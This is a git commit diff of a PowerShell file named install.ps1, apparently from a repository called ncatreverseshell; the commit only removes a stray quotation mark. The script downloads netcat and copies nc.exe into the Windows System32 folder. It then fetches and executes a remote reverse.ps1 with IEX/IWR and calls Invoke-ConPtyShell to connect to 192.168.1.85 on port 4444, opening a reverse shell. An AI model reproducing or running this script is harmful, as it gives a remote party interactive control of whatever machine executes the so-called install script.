a8ff98e0468de5fdece8e6bb9fe22f4f6063d419
bjrumplee <130537869+bjrumplee@users.noreply.github.com>
2023-05-05 13:25:50 -0700

    Update install.ps1

--- install.ps1
+++ install.ps1
@@ -1,4 +1,4 @@
 (New-Object System.Net.WebClient).DownloadFile('https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip', 'C:\Temp\netcat.zip')
 Expand-Archive -Path 'C:\Temp\netcat.zip' -DestinationPath 'C:\Temp\netcat' -Force
 Move-Item -Path 'C:\Temp\netcat\nc.exe' -Destination 'C:\Windows\System32' -Force
-IEX(IWR https://raw.githubusercontent.com/bjrumplee/ncatreverseshell/main/reverse.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.1.85 4444"
+IEX (IWR https://raw.githubusercontent.com/bjrumplee/ncatreverseshell/main/reverse.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.1.85 4444
